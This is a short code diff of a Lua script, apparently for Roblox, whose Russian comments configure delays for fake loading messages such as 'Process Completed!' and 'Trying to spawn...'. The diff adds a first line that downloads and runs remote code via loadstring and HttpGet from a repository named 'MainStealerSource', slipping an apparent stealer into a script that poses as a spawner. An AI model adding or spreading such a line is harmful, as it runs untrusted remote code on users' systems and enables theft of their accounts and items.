@@ -1,3 +1,5 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/hubsrblx/MainStealerSource/refs/heads/main/Source.txt')))()
+
 -- ========== НАСТРОЙКИ ВРЕМЕНИ ==========
 local LOADING_COMPLETED_DELAY = 3      -- Задержка надписи "Process Completed!"
 local LOADING_SPAWNING_DELAY = 3       -- Задержка надписи "Trying to spawn..."
